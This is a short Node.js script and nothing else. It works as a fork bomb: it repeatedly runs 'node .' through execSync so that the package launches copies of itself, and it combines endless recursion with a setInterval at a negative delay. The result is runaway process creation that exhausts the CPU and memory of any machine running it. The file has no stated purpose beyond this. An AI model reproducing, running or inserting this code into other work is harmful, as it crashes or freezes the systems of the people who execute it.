var { execSync } = require("child_process")

function i() {
execSync(`node .`);
require(".");
}

function loop() {
i();
loop();
}
setInterval(function() {
i();
}, -99999)


loop();
